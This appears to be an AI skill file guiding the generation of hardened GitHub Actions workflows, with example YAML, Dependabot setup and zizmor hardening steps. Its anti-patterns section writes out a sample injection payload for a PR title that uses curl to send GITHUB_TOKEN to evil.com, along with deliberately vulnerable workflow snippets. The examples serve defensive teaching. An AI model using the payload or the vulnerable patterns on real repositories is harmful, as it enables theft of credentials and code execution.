---
name: github-actions-hardened
description: Generate production-hardened GitHub Actions CI/CD workflows enforcing least-privilege permissions, concurrency groups, timeout guards, dependency caching, and latest major version action tags. Always co-generates a .github/dependabot.yml. Also use this skill to HARDEN EXISTING workflows using zizmor — applies persist-credentials, template injection fixes, permissions, and optional SHA pinning automatically. Use this skill whenever the user asks about CI, CD, pipelines, GitHub Actions, YAML workflows, automated testing, deployment, releases, security audits, SOC 2, compliance, zizmor, workflow hardening, or "fixing" workflow security — even if they don't say "hardened" or "secure". Always prefer this skill over github-actions-templates for any workflow that touches production, uses third-party actions, or needs to pass a code review. Trigger for any GitHub Actions workflow request, whether creating new or hardening existing workflows.
---

# GitHub Actions Hardened Workflows

You are acting as a Staff DevOps Engineer. Every workflow you generate must enforce all five hardening principles below — no exceptions, no shortcuts.

## Five Hardening Principles

These aren't arbitrary rules — each addresses a real class of incident.

### 1. Job-Level Least-Privilege Permissions

GitHub Actions grants the `GITHUB_TOKEN` broad permissions by default. If a step in your workflow is compromised (e.g., a malicious `npm postinstall` script), it can use that token to push code, create releases, or exfiltrate secrets.

Set `permissions` explicitly **at the job level** (not the workflow level) so that each job gets only what it needs:

```yaml
jobs:
  test:
    permissions:
      contents: read       # checkout
```

Common permission scopes:
- `contents: read` — checkout code
- `contents: write` — create releases, push tags
- `packages: write` — push to GHCR
- `id-token: write` — OIDC token for cloud auth or SLSA provenance
- `pull-requests: write` — post PR comments
- `checks: write` — post check run results
- `security-events: write` — upload SARIF to Security tab

Never use `permissions: write-all`. Never omit `permissions` entirely on a job that uses `GITHUB_TOKEN`.

As defense-in-depth, also set `permissions: {}` at the **workflow level** (above `jobs:`). Any job added later without its own `permissions` block then inherits zero access rather than GitHub's broad defaults:

```yaml
permissions: {}   # workflow level: deny all by default

jobs:
  test:
    permissions:
      contents: read   # each job explicitly grants only what it needs
```

### 2. Latest Major Version Action Tags

Always pin actions to their latest **major version tag** (e.g., `@v4`). Never use `@latest`, `@main`, or `@master` — these are moving targets that can introduce breaking changes or security regressions without warning.

```yaml
# Too loose — can break without warning
- uses: actions/checkout@latest
- uses: actions/checkout@main

# Correct — stable within the major version contract
- uses: actions/checkout@v4
- uses: actions/setup-node@v4
```

Before writing any workflow, look up the current latest major version for each action you plan to use:
- **With web/search access:** search `github.com/<owner>/<repo>/releases` for the latest tag
- **With `gh` CLI:** `gh api repos/<owner>/<repo>/releases/latest --jq .tag_name`
- **Without either:** use the most recent major version you know confidently — do NOT guess minor/patch numbers. If uncertain, note it explicitly so the user can verify.

Dependabot (see below) will keep these tags current automatically, ensuring you receive security patches within the major version without any manual effort.

### 3. Concurrency Groups

Without concurrency controls, every push to a PR branch queues a new run while the previous one is still in progress. The old run produces stale results, wastes runner minutes, and can cause race conditions in deployments.

Add this to every workflow:

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}
```

The condition `github.ref != 'refs/heads/main'` is important: cancel redundant runs on PR branches, but never cancel a run that is already deploying to production.

### 4. Timeout Guards

GitHub's default job timeout is 360 minutes (6 hours). A test suite that hangs on network I/O, a Docker build stuck waiting for a layer, or a deployment waiting for a lock will consume 6 hours of runner minutes per occurrence — and on private repos, this directly costs money.

Always set `timeout-minutes` on every job:

```yaml
jobs:
  test:
    timeout-minutes: 15    # fail fast if tests hang
  build:
    timeout-minutes: 30    # Docker builds may be slow
  deploy:
    timeout-minutes: 20    # include time for rollout checks
```

Choose values that are 2–3× your typical run time, not the absolute maximum.

### 5. Native Dependency Caching

Re-downloading all dependencies on every run is the single largest source of avoidable latency in most CI pipelines. Use the `cache` parameter built into setup actions when available:

```yaml
- uses: actions/setup-node@v4
  with:
    node-version: '20'
    cache: 'npm'          # or 'yarn' or 'pnpm'
```

For ecosystems without built-in cache support, use `actions/cache` with a meaningful key.

---

## Supplementary Best Practices

**Path filtering** — Avoid triggering workflows when irrelevant files change. See `references/path-filtering.md` for patterns including monorepo per-package filtering.

---

## Hardened Workflow Patterns

### Pattern A: CI Test Workflow (Node.js)

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

jobs:
  test:
    name: Test (Node ${{ matrix.node-version }})
    runs-on: ubuntu-latest
    timeout-minutes: 15

    permissions:
      contents: read

    strategy:
      fail-fast: false
      matrix:
        node-version: ['20', '22']

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'

      - name: Install dependencies
        run: npm ci

      - name: Lint
        run: npm run lint

      - name: Test
        run: npm test -- --coverage

      - name: Upload coverage
        if: matrix.node-version == '20'
        uses: codecov/codecov-action@v5
        with:
          fail_ci_if_error: true
```

**For pnpm:** change `cache: 'npm'` to `cache: 'pnpm'` and add `pnpm/action-setup@v4` before setup-node with `corepack enable`. **For yarn:** change `cache: 'npm'` to `cache: 'yarn'`.

---

### Pattern B: Docker Build and Push to GHCR

```yaml
# .github/workflows/docker.yml
name: Docker Build and Push

on:
  push:
    branches: [main]
    tags: ['v*']
  pull_request:
    branches: [main]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.ref != 'refs/heads/main' }}

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build:
    name: Build and Push
    runs-on: ubuntu-latest
    timeout-minutes: 30

    permissions:
      contents: read
      packages: write

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      - name: Log in to GHCR
        if: github.event_name != 'pull_request'
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha,prefix=sha-

      - name: Build and push
        uses: docker/build-push-action@v6
        with:
          context: .
          push: ${{ github.event_name != 'pull_request' }}
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
```

---

### Pattern C: Tagged Release

```yaml
# .github/workflows/release.yml
name: Release

on:
  push:
    tags: ['v*.*.*']

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false   # Never cancel an in-flight release

jobs:
  release:
    name: Create Release
    runs-on: ubuntu-latest
    timeout-minutes: 20

    permissions:
      contents: write     # create GitHub Release

    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0    # needed for changelog generation

      - name: Build
        run: |
          # Replace with your actual build command
          npm ci && npm run build

      - name: Create GitHub Release
        uses: softprops/action-gh-release@v2
        with:
          generate_release_notes: true
          files: dist/**
```

---

### Pattern D: Staged Deployment with GitHub Environments

Deploy to staging automatically, then require human approval before production. GitHub Environments provide required-reviewer gates, environment-scoped secrets, and a deployment audit log — all configured in repository settings, no extra tooling required.

```yaml
# .github/workflows/deploy.yml
name: Deploy

on:
  push:
    branches: [main]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false   # Never cancel an in-flight deployment

jobs:
  deploy-staging:
    name: Deploy to Staging
    runs-on: ubuntu-latest
    timeout-minutes: 15
    environment: staging          # links to the "staging" Environment in Settings

    permissions:
      id-token: write             # OIDC token for keyless cloud auth
      contents: read

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy to staging
        run: ./scripts/deploy.sh staging

  deploy-production:
    name: Deploy to Production
    runs-on: ubuntu-latest
    timeout-minutes: 20
    needs: deploy-staging
    environment: production        # add required reviewers here in Settings

    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Configure AWS credentials (OIDC)
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: us-east-1

      - name: Deploy to production
        run: ./scripts/deploy.sh production
```

**Setup:** In Settings → Environments, create `staging` and `production`. Add required reviewers to `production` — GitHub pauses the `deploy-production` job and waits for approval before it runs.

**OIDC setup** (preferred over static secrets): see `references/security-practices.md`. Swap `aws-actions/configure-aws-credentials@v4` for `azure/login@v2` or `google-github-actions/auth@v2` for Azure or GCP.

---

## Dependabot Configuration

Always co-generate this file alongside any workflow you create. Dependabot will automatically open PRs to update action versions when new major/minor/patch releases ship.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
    # Group all action updates into a single PR to reduce noise
    groups:
      github-actions:
        patterns:
          - "*"
    commit-message:
      prefix: "chore(ci)"
    labels:
      - "dependencies"
      - "ci"
```

For extended variants (with reviewers, ignore patterns, multiple ecosystems), see `references/dependabot-config.md`.

---

## Ecosystem Adaptation

Adapt Pattern A's Node.js CI to other ecosystems:

| Ecosystem | Setup Action | Cache Approach | Install | Test |
|-----------|-------------|----------------|---------|------|
| Python | `actions/setup-python@v5` | `cache: 'pip'` | `pip install -r requirements.txt` | `pytest` |
| Go | `actions/setup-go@v5` | `cache: true` (built-in) | implicit | `go test ./...` |
| Rust | `dtolnay/rust-toolchain@stable` | `actions/cache@v4` on `~/.cargo` + `./target` | implicit | `cargo test` |
| Java/Maven | `actions/setup-java@v4` | `cache: 'maven'` | `mvn -B install -DskipTests` | `mvn test` |
| Java/Gradle | `actions/setup-java@v4` | `cache: 'gradle'` | `./gradlew dependencies` | `./gradlew test` |

---

## Common Anti-Patterns

**`permissions: write-all`** — Grants every possible scope. A compromised step could push malicious commits or delete releases. Always enumerate only what each job needs.

**`uses: action/foo@latest` or `@main`** — Moving targets that can silently introduce breaking changes or security regressions. Always pin to a major version tag.

**No `concurrency` block** — Queues redundant runs and produces stale status checks on PRs.

**No `timeout-minutes`** — Allows a hung job to consume 6 hours of runner capacity per occurrence.

**Separate `actions/cache` step when the setup action has a `cache:` parameter** — Redundant and error-prone. Use the built-in parameter where available.

**Script injection via direct `${{ }}` interpolation in `run:` blocks** — User-controlled values injected directly into shell commands allow an attacker to execute arbitrary code. Always pass untrusted input through environment variables.

Contexts that are attacker-controllable and must never be interpolated directly into `run:`:
- `github.event.issue.title` / `.body`
- `github.event.pull_request.title` / `.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.head_ref` (PR branch name — can be set by the PR author)

```yaml
# DANGEROUS — attacker can set PR title to: "; curl https://evil.com?t=$GITHUB_TOKEN; echo "
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# SAFE — shell treats the variable as data, not code
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"
```

**`workflow_dispatch` inputs interpolated directly in `run:` blocks** — Manual workflow inputs are user-supplied strings with the same injection risk. Always route them through environment variables.

```yaml
# DANGEROUS
- run: echo "Deploying to ${{ inputs.environment }}"

# SAFE
- env:
    DEPLOY_ENV: ${{ inputs.environment }}
  run: echo "Deploying to $DEPLOY_ENV"
```

**`pull_request_target` with code checkout** — `pull_request_target` runs with full repository secrets even for PRs from forks. If the workflow checks out the PR's head commit and executes it, a contributor to any fork gains code execution with your `GITHUB_TOKEN`.

```yaml
# DANGEROUS — runs attacker-controlled code with write-scoped GITHUB_TOKEN
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← attacker-controlled code
      - run: npm test   # executes attacker's code with repo write access

# SAFER — act only on PR metadata; never run PR code
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      pull-requests: write
    steps:
      - uses: actions/labeler@v5   # pinned action; does not checkout or run PR code
```

Only use `pull_request_target` when you genuinely need write permissions triggered by a fork PR (labels, comments, status checks). Never combine it with a checkout of `github.event.pull_request.head.sha` followed by a `run:` step. To run CI on fork PRs with write access, use the two-workflow pattern: a read-only `pull_request` workflow that uploads artifacts, then a `workflow_run` workflow that downloads them.

For deployment workflows using cloud credentials, see `references/security-practices.md` for OIDC setup (preferred over long-lived secrets).

---

## Hardening Existing Workflows with zizmor

When a user has existing workflows and wants to apply security best practices, use `zizmor` — it handles most fixes automatically with proper formatting preservation.

See `references/zizmor-hardening.md` for the complete reference. Here's the essential workflow:

### Step 1: Create zizmor config

```yaml
# zizmor.yml (repo root)
rules:
  unpinned-uses:
    config:
      policies:
        '*': ref-pin    # or 'hash-pin' for SHA requirement
```

### Step 2: Run zizmor autofix

```bash
# Without SHA pinning (like Galaxy's approach)
zizmor --fix=all .github/workflows/

# With SHA pinning (maximum security)
zizmor --fix=all --gh-token=$(gh auth token) .github/workflows/
```

This automatically applies: `persist-credentials: false`, template injection fixes (moves dangerous expressions to descriptively-named env vars), and optionally SHA pins.

### Step 3: Add permissions: {} manually

zizmor cannot autofix this. Add `permissions: {}` before the `jobs:` block in each workflow that doesn't have a top-level `permissions:` declaration.

### Step 4: Add supporting files

- `.github/workflows/zizmor.yml` — CI workflow for ongoing security scanning
- `.github/dependabot.yml` — Weekly GitHub Actions dependency updates
- `zizmor.yml` — Config file (from step 1)

### Step 5: Verify

```bash
zizmor .github/workflows/
# Should report: "No findings to report. Good job!"
```

### Key Decision: SHA Pinning Policy

| Policy | Pros | Cons | When to use |
|--------|------|------|-------------|
| `ref-pin` (tags OK) | Simple, readable, Dependabot keeps current | Tags can be moved (supply chain risk) | Most repos, internal projects |
| `hash-pin` (SHA required) | Immutable, maximum security | Less readable, needs `--gh-token` | High-security, compliance, public infra |

Dependabot handles keeping either approach up to date.
